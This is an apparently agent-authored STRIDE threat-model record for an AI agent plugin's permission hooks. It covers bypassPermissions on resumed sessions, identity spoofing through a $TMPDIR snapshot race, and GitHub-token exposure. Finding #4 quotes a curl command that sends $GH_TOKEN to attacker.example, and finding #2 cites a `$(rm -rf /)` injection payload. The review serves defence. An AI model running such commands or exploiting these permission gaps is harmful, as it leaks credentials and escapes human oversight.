# issue-894 — security-threat-model: permission/auto-grant posture (retrospective STRIDE review)

kind: security-threat-model
canonical: this record's own STRIDE table and mitigation list below — read/authored live, this
session
loop_state: closed

## What was done

Retrospective STRIDE-style review of the permission/auto-grant posture built by this session:
the `merge`/`spawn`/`gh-write` allow-hooks, `session-role-bind.sh`'s identity primitive,
`--permission-mode bypassPermissions` on resumed orchestrator sessions (#889), and the
credential-token flow (`_resolve_gh_token`, `resolve_harness_github_token`,
`credential-record-guard.sh`). Produces a STRIDE table ranked by severity, a disposition per
mitigation-list entry, a post-mitigation residual-risk-note with approver reference per finding
class, and canonical code citations, per issue #894 step 1 and the approved proposal.

## Why

issue #894: this session landed a series of security-sensitive, permission-broadening changes
(#816, #823, #859/#869/#874, #889, #862) without ever routing them through security-threat-model.
The orchestrator's own inline reasoning about safety is not a substitute for an explicit threat
model, particularly for a plugin whose entire mechanism is auto-granting elevated Bash capability
by default. This record supplies that missing review for step 1; step 2 (structural enforcement)
and step 3 (fix implementation) are separate, later work units this record hands off to.

## Upstream basis

- docs/issue-894/proposals/security-threat-model.md (approver action: issue comment body exactly
  `APPROVE issue-894/security-threat-model`)
- docs/issue-894/reports/security-threat-model/survey.md (phase-1 current-state survey)

## code_under_review

- on-the-record/hooks/merge-allow-gate.sh
- on-the-record/hooks/spawn-allow-gate.sh
- on-the-record/hooks/gh-write-allow-gate.sh
- on-the-record/hooks/credential-record-guard.sh
- on-the-record/hooks/session-role-bind.sh
- spawn.py (`_resume_orchestrator_session`, `_resolve_gh_token`, `_git_env`, role-spawn
  `bypassPermissions` call sites)
- harness/driver.py (`resolve_harness_github_token`, `resolve_harness_github_host`,
  `resume_orchestrator_session`)

## Asset inventory

| Asset | Why it matters |
|---|---|
| Orchestrator identity (`CLAUDE_ROLE` empty) | Gate to merge-allow-gate.sh / gh-write-allow-gate.sh's auto-`allow` — the highest-trust identity in this system |
| `GH_TOKEN` / `NORTHPOLE_HARNESS_GH_TOKEN` | Live GitHub credentials with write scope on the real repo |
| Host permission-prompt default-deny | The fallback that governs every Bash shape the allow-hooks do not recognize |
| `docs/**` tree | The only surface `credential-record-guard.sh` inspects for credential leakage |

## Trust boundary map (DFD, prose)

```
[repo content / issue body / PR body]  -- text only, never argv --> [gh CLI args, inert]
[role session (CLAUDE_ROLE set)] --Bash--> [PreToolUse hooks] --allow only--> [host permission engine]
[orchestrator session (CLAUDE_ROLE empty)] --Bash--> [PreToolUse hooks: merge/gh-write/spawn-allow-gate] --allow--> [host permission engine (bypassPermissions on resume: ABSENT)]
[spawn.py / driver.py] --subprocess env--> [GH_TOKEN into role session env + git credential helper]
[any local process sharing $TMPDIR] -.-> [otr-role-bind/<session_id>.json] (write race, see finding #3)
```

The boundary this review centers on: on a **resumed** orchestrator turn, the host's own
default-deny (which normally backstops every Bash shape the allow-hooks don't recognize) is
replaced by `bypassPermissions`, which has no deny concept at all. The allow-hooks still run and
still only ever emit `allow`, never `deny` — so the boundary that used to catch the residual
case (no `allow` emitted → previously fell to host deny) now has nothing behind it.

## STRIDE table (ranked most-severe first)

### 1. Elevation of Privilege — `bypassPermissions` on resume removes default-deny outside the allow-hooks' recognized shapes

canonical: spawn.py:2245-2260 (`_resume_orchestrator_session`), harness/driver.py:270-281
(`resume_orchestrator_session`) — read live, this session

**Threat**: a resumed orchestrator turn (`claude -p ... --resume <id> --permission-mode
bypassPermissions`) runs with no host permission prompt at all.

canonical: on-the-record/hooks/merge-allow-gate.sh:1-231,
on-the-record/hooks/spawn-allow-gate.sh:1-177, on-the-record/hooks/gh-write-allow-gate.sh:1-190
— read live, this session
None of the three allow-hooks contains a `"permissionDecision": "deny"` literal or `exit 2` —
each only emits `allow` JSON or a bare `exit 0`. Any Bash shape those three hooks do not
recognize — `gh repo delete`, `git push --force`, `rm -rf`, an arbitrary shell one-liner the
resumed turn itself assembles while reasoning over untrusted repo/issue/PR content — previously
fell through to the host's own default-deny prompt. Under `bypassPermissions` that fallback does
not exist; the resumed turn can run any Bash command with no permission gate whatsoever.

canonical: spawn.py:2245-2260, harness/driver.py:270-281 (in-code comment text) — read live,
this session
The in-code comments assert this precise gap, citing `docs/issue-886/reports/implementation/
hunt-issue-886-permission-mode-fix.md` as the source of the empirical claim.

unverifiable: that hunt record's own claim (bypassPermissions removes the host fallback default-
deny) was cited here by path, not independently re-executed in this review — this record treats it
as asserted-by-citation, per the approved proposal's stated scope boundary (survey:
"bypassPermissions-on-resume: in-repo claim").

**Severity (CVSS-style)**: Critical (9.1) — AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H. Local-execution
vector (requires the resumed process to exist), low complexity (no special conditions beyond a
resume firing), no privileges/interaction required by an external attacker who can only steer via
repo/issue/PR content the resumed turn reads, scope-changed (crosses from the plugin's own
allow-list boundary into unrestricted host execution), high confidentiality/integrity/availability
impact (arbitrary command execution with the orchestrator's full credentials, including
`GH_TOKEN`).

**Disposition**: mitigate (완화). Concrete recommendation — drop `bypassPermissions` on the
resume call in both `spawn.py::_resume_orchestrator_session` and
`harness/driver.py::resume_orchestrator_session`; rely on the specific allow-hooks
(`merge-allow-gate.sh`, `gh-write-allow-gate.sh`, `spawn-allow-gate.sh`) to grant exactly the safe
commands a resumed turn needs, while the host's own default-deny governs everything else, exactly
as it does for a non-resumed orchestrator turn today.

canonical: spawn.py:2245-2260 (in-code comment text) — read live, this session
The in-code comment already names the two Bash shapes a resume genuinely needs beyond what the
three hooks cover — `gh pr merge`, `git fetch`, and `spawn.py` invocations all get denied under
`acceptEdits` per the comment's own text — so the fix is not "use `acceptEdits`" (file-edit-only,
insufficient per the same comment) but to extend `spawn-allow-gate.sh` (or add a narrow sibling
`git-fetch-allow-gate.sh`) with the same shape-discipline (shlex + fixed verb shape +
orchestrator-identity check, mirroring merge-allow-gate.sh:91-153) for
`git fetch [<remote>] [<refspec>]` with no chaining/substitution operator, then resume with the
host's ordinary permission mode (no `--permission-mode` flag, or `acceptEdits` for the file-edit
portion) instead of `bypassPermissions`.

residual-risk-note: Low, contingent on the fix above landing. approver: pending —
this rating requires sign-off per docs/specs/approvers.md (contract v3 §19 Approve gate) before
the fix is implemented; the fix itself is a recommendation of this record, not yet approved or
built. Once the resume path runs under host default-deny plus a `git-fetch`-shaped allow-hook,
residual exposure narrows to the same shape-validation risk already accepted for the other three
hooks (finding #2 below), not open-ended command execution.

### 2. Tampering — argument-text smuggling past the shlex/quoted-heredoc checks

canonical: on-the-record/hooks/merge-allow-gate.sh:91-153,
on-the-record/hooks/gh-write-allow-gate.sh:79-171 — read live, this session

**Threat**: could a crafted `--body`, issue title, or repo content smuggle a command past the
allow-hooks' shape checks? All three hooks tokenize the *entire* `tool_input.command` with
`shlex.shlex(cmd, posix=True, punctuation_chars=True)` and require the token list to match one of
a small fixed set of verb shapes (optionally one `cd DIR &&` prefix), rejecting any command
containing a backtick, `$(`, or newline outside one narrow exception (below), and rejecting any
operator token (`;`, `&&` beyond the one tolerated prefix, `|`, `>`, etc.) anywhere in the tail
(merge-allow-gate.sh:99-129, gh-write-allow-gate.sh:125-171).

canonical: on-the-record/hooks/gh-write-allow-gate.sh:82-84 — read live, this session
No token past the verb is ever inspected for content — the comment there states this explicitly
("the decision is keyed on shape, never on argument text"). A malicious `--body "$(rm -rf /)"` is
not smuggled into execution; it is rejected outright by the `$(` check (line 125) before
shape-matching ever runs, and a benign `--body "some text"` is allowed through to `gh` only as an
inert CLI argument (never re-interpreted by a shell) — there is no vector in this design for
argument text to become executed code through this allow path.

canonical: on-the-record/hooks/gh-write-allow-gate.sh:108-123 — read live, this session
The one deliberate exception, `$(cat <<'DELIM' ... DELIM)`, collapses to an inert placeholder
only when (a) it is the command's sole substitution (`len(_subs) == 1`) and (b) nothing outside
the matched span still contains `$(` or a backtick (line 117). A **quoted** heredoc delimiter is
a POSIX primitive that disables all expansion of its body by construction, so the body's own
content (including embedded backticks/`$(` — issue #873's fix) cannot execute anything regardless
of what text it contains; the exception is safe by the shell's own quoting semantics, not by this
hook's parsing correctness alone. The regex's non-greedy body match (`.*?`) stops at the first
line matching the delimiter, matching how a real POSIX shell heredoc reader behaves — a crafted
body containing a line identical to the delimiter does not desync the hook's view from the
shell's own; both terminate the heredoc at the same point.

**Severity**: Informational — no exploitable injection path was surfaced this review over the
scope above; recorded to answer the issue's explicit question rather than as an open threat.

**Disposition**: accept (수용) — the current design is sound by construction (verb-shape matching
+ no argument-text inspection + heredoc quoting semantics). No mitigation needed; residual
exposure is carried by the general fragility of hand-matched shape lists (see finding #4) rather
than this specific injection question.

residual-risk-note: None required — no mitigation applies. approver: N/A — no disposition
requiring a fix sign-off; re-examine if the heredoc regex or shape list changes.

### 3. Elevation of Privilege — role session masquerading as orchestrator identity

canonical: on-the-record/hooks/session-role-bind.sh:1-91,
on-the-record/hooks/merge-allow-gate.sh:131-153 — read live, this session

**Threat**: can a role session (`CLAUDE_ROLE` set at spawn) masquerade as the orchestrator
(`CLAUDE_ROLE` empty) to trigger the auto-`allow` in `merge-allow-gate.sh`/
`gh-write-allow-gate.sh`? For the live-tampering shape the issue names, this review's code reading
says no: `session-role-bind.sh` snapshots `CLAUDE_ROLE` into
`$TMPDIR/otr-role-bind/<sanitized session_id>.json` at `SessionStart` — before any
session-controlled code (including the model's own Bash calls) has run
(session-role-bind.sh:1-15). "First-observation wins" (session-role-bind.sh:64-67): a later
`SessionStart` replay never overwrites an existing snapshot. The allow-hooks then prefer this
snapshot over the live env var (merge-allow-gate.sh:136-151) — so a role session that later
`export`s `CLAUDE_ROLE=""` in its own Bash context still resolves to its bound role via the
snapshot, and the auto-`allow` path (which requires `role` to be falsy at merge-allow-gate.sh:152)
still resolves against the bound role, not the tampered env var.

canonical: on-the-record/hooks/session-role-bind.sh:16-24 — read live, this session
Survey gap this review addresses: `session-role-bind.sh` no-ops (writes no snapshot) whenever
`CLAUDE_ROLE` is unset — i.e., the orchestrator's own sessions never get a snapshot file. This is
intentional (the orchestrator's identity is "no role", represented by absence), but it means the
orchestrator-path identity check ultimately still rests on the live env var when no snapshot
exists (merge-allow-gate.sh:150-151 fallback), same posture as before session-role-bind.sh
existed for that one path. This is not exploitable by a role session directly (its own
session_id's snapshot, once written, cannot be un-written or downgraded — first-observation-wins
protects the role's own binding, not the orchestrator's), but it surfaces a narrower local-
attacker race: two *different* sessions sharing `$TMPDIR` (a shared multi-tenant host, or a
predictable/enumerable `session_id`) let a process with local filesystem write access to
`$TMPDIR` pre-create `otr-role-bind/<future-session_id>.json` with `{"role": ""}` before the real
`SessionStart` fires, and first-observation-wins would make that forged snapshot permanent for
that session.

unverifiable: whether `session_id` is predictable or enumerable before its own `SessionStart`
hook fires — the fetched official docs (survey: "Official-doc facts") establish only that
`session_id` carries no cryptographic binding, not its generation scheme, and this review ran no
further check against the live harness to settle it.

**Severity**: Medium (5.9) — AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:H/A:N. Requires local filesystem
access to `$TMPDIR` (already a privileged local position) and the unresolved `session_id`
prediction/race above; if achievable, grants the orchestrator's own auto-allow surface to an
attacker-controlled process.

**Disposition**: mitigate (완화). Recommend: (a) settle `session_id`'s generation/predictability
against the official docs or empirically — an open item this review leaves for the follow-up work
noted below; (b) if `$TMPDIR` can be shared across trust domains on any supported host, move
`OTR_ROLE_BIND_STATE_DIR` to a per-user, mode-0700 directory the hook creates itself rather than
trusting the ambient `$TMPDIR` default; (c) consider writing the orchestrator's own empty-role
snapshot explicitly (rather than relying on absence-of-file) so both identities share the same
first-observation-wins primitive instead of only one of them benefiting from it.

residual-risk-note: Low, contingent on (b)/(c) landing. approver: pending — requires
docs/specs/approvers.md sign-off before (b)/(c) are implemented; residual exposure after
mitigation is bounded by an attacker who already has local `$TMPDIR`-adjacent privilege, a much
narrower threat actor than the current design's exposure.

### 4. Information Disclosure — credential flow scope limited to `docs/**` writes

canonical: spawn.py:3927,4391-4415,4418-4430; harness/driver.py:66-107;
on-the-record/hooks/credential-record-guard.sh:1-114 — read live, this session

**Threat**: `_resolve_gh_token()` shells out to `gh auth token` once per process and injects the
result as `GH_TOKEN` into every role session's environment (spawn.py:3927) and into the
orchestrator's own git credential-helper env (`_git_env()`, spawn.py:4418+).
`resolve_harness_github_token()` does the same for a second, separate credential
(`NORTHPOLE_HARNESS_GH_TOKEN`, harness/driver.py:66-84). `credential-record-guard.sh` denies a
`docs/**` write whose content matches a full-length GitHub/OpenAI/AWS credential pattern
(including a MultiEdit fragment-concatenation check) — but its guard scope is `docs/**` writes
only; it does not inspect Bash command text, subprocess stdout/stderr, or any non-`docs/` file
write. A role session that (deliberately or via a prompt-injected instruction from untrusted
repo/issue content) echoes `$GH_TOKEN` into a Bash command
(`curl ... -H "Authorization: token $GH_TOKEN" https://attacker.example`) or writes it to a
non-`docs/` file has no guard at all along that path.

**Severity**: High (7.5) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N. Requires a role session to be
steered (by prompt injection from repo/issue/PR content it reads, since `CLAUDE_ROLE` sessions
are the ones granted `GH_TOKEN`) into exfiltrating the token via a channel `credential-record-
guard.sh` does not cover; high confidentiality impact given the token's write scope on the real
repo.

**Disposition**: mitigate (완화). Recommend scoping the token more narrowly than a live user
token where possible (e.g., a repo-scoped, short-lived, or fine-grained PAT for role sessions
that only need `gh issue`/`gh pr` write operations, rather than whatever scope `gh auth token`
returns for the orchestrator's own authenticated identity), and/or extending a credential-pattern
guard to Bash command text and subprocess output paths, not only `docs/**` writes. A `transfer`
disposition to the hosting environment's own network egress controls is an option worth
scoping — noted here since this review did not verify whether such a control exists.

residual-risk-note: Medium, contingent on the mitigations above landing. approver: pending —
docs/specs/approvers.md sign-off required before scope-narrowing or extended guard coverage
lands; even after mitigation, a role session retains a live, if narrower, credential in its own
process env by design (necessary for its `gh`-issuing job), so residual exposure to a
sufficiently steered role session does not reach Low.

### 5. Repudiation — auto-granted actions leave an attributable trail

canonical: on-the-record/hooks/merge-allow-gate.sh:214-224,
on-the-record/hooks/gh-write-allow-gate.sh:173-183 (permissionDecisionReason emission) — read
live, this session

**Threat**: does an auto-granted action leave a record of why it was granted? Both
`merge-allow-gate.sh` and `gh-write-allow-gate.sh` emit a `permissionDecisionReason` string
(e.g. "merge-allow-gate: PR #%s is landing_readiness=READY ... issue #810") into the hook's own
JSON output, and the underlying `gh` action itself remains independently visible in GitHub's own
PR/issue timeline (author, timestamp) regardless of this plugin. This review's reading of the two
hooks surfaces no repudiation gap beyond the observation that the hook's own reasoning string has
no durable home outside the tool-call transcript for that turn — it is not written to a separate
audit log by these scripts.

**Severity**: Low (2.7) — AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N. Minor traceability gap (the
reasoning string's only durable home is the transcript, not a separate audit log), not an
attribution failure.

**Disposition**: accept (수용). The GitHub-side action record is the durable audit trail; the
hook's reason string is a debugging aid for the *decision*, not the *action*, and duplicating it
into a separate log is not proportionate to the risk here.

residual-risk-note: Low, unchanged (no mitigation applied). approver: N/A —
no fix proposed, so no sign-off required; re-open if a future finding needs a durable
decision-reason audit trail.

### 6. Denial of Service — out of scope, no DoS-shaped gap surfaced

canonical: docs/issue-894/proposals/security-threat-model.md ("Out of scope" section) — read
live, this session

Per the issue's own framing (permission/auto-grant review, not availability) and the approved
proposal's Out of scope section, DoS was not deep-dived this review. This review's incidental reading
of the six reviewed artifacts (findings #1-#5 above) surfaces no unbounded-retry or
resource-exhaustion pattern that would warrant reopening this as an in-scope finding.

**Disposition**: accept (수용) — explicitly out of scope per the approved proposal; not evaluated
this review.

residual-risk-note: N/A — not evaluated this review. approver: N/A.

## Mitigation list (disposition summary)

| # | Finding | Disposition | residual-risk-note |
|---|---|---|---|
| 1 | EoP — `bypassPermissions` on resume removes default-deny | mitigate (완화) | Low, pending approver sign-off |
| 3 | EoP — role-session masquerade via `$TMPDIR` race | mitigate (완화) | Low, pending approver sign-off |
| 4 | Info disclosure — credential flow beyond `docs/**` guard scope | mitigate (완화) | Medium, pending approver sign-off |
| 2 | Tampering — argument-text smuggling | accept (수용) | None required |
| 5 | Repudiation — decision-reason not durably logged | accept (수용) | Low, unchanged |
| 6 | DoS — out of scope | accept (수용) | N/A |

## Open findings

- Finding #1 (highest severity): the fix recommendation (extend `spawn-allow-gate.sh` or add a
  `git-fetch`-shaped allow-hook, drop `bypassPermissions` on resume) is not yet implemented —
  that is step 3 of issue #894's execution plan, a separate work unit.
- Finding #3: whether `session_id` is predictable/enumerable before `SessionStart` fires was left
  unverifiable this review (see the `unverifiable:` line in finding #3 above); settling it would
  let the residual-risk-note tighten or the finding drop.
- Finding #4: whether a network-egress control exists in the hosting environment (that a
  `transfer` disposition could lean on) was not verified this review.
- Step 2 of issue #894 (structural enforcement — a board-condition/gate requiring a
  security-threat-model record before a trust-boundary change can land) sits explicitly outside
  this record's scope per the approved proposal; hands off to a future security-threat-model or
  orchestration-design work unit.

## Next steps

1. Open a step-3 implementation work unit (new issue or a continuation of #894) to land the
   finding-#1 fix: extend the allow-hook set to cover `git fetch` (and any other Bash shape a
   resume genuinely needs) under the specific-shape discipline, then remove
   `--permission-mode bypassPermissions` from both `spawn.py::_resume_orchestrator_session` and
   `harness/driver.py::resume_orchestrator_session`.
2. Settle the `session_id` predictability question (finding #3) before deciding whether the
   `$TMPDIR`-race mitigation is load-bearing or precautionary.
3. Design step 2 (structural enforcement of security-threat-model for trust-boundary changes) as
   its own proposal, informed by this record's finding set as the concrete "what must be caught"
   list.

## Resolution path (for open findings)

Each open finding above resolves either by a follow-up implementation PR (finding #1, #3
partially) whose citation shows the fix landed in code, or by a named approver's
docs/specs/approvers.md sign-off recording the residual-risk-note as accepted-as-is (findings
#1/#3/#4's "pending" approver references, once a named approver reviews this record).

## Canon references

- code.claude.com/docs/en/hooks — external canon establishing: `session_id` carries no
  cryptographic binding (informs findings #1/#3's identity-trust analysis); documented
  `permissionDecision` values (`allow`/`deny`/`ask`/`defer`); `PreToolUse` fires on every tool
  call including under `bypassPermissions` (the payload still reaches the allow-hooks, informing
  the "hooks still run" boundary in finding #1).

canonical: WebFetch https://code.claude.com/docs/en/hooks — executed live, this session,
2026-08-12
The fetch did not resolve whether a hook's `deny` is honored under `bypassPermissions` — flagged
there as an unresolved excerpt gap, not re-derived in this review since no hook reviewed here emits
`deny` regardless.
- code.claude.com/docs/en/headless.md ("Background tasks at exit" section) — external canon cited
  in-code (spawn.py:2231-2245, harness/driver.py:257-270) establishing that a headless `-p`
  process cannot be revived in-process after `end_turn`, only re-invoked via `--resume` — the
  basis for why a resume path exists at all. Not independently re-fetched this review; cited as the
  in-code comment already attributes it.
- docs/issue-886/reports/implementation/hunt-issue-886-permission-mode-fix.md — in-repo canon
  establishing the empirical claim finding #1 rests on (bypassPermissions removes the fallback
  default-deny for allow-hook-unrecognized Bash shapes). Cited by path per the proposal's stated
  boundary; not independently re-read/re-executed in this review (see finding #1's `unverifiable:`
  line).
- docs/specs/approvers.md — external-to-this-record canon establishing the accepted approver list
  and the contract v3 §19 Approve-gate mechanism this record's residual-risk-notes reference.
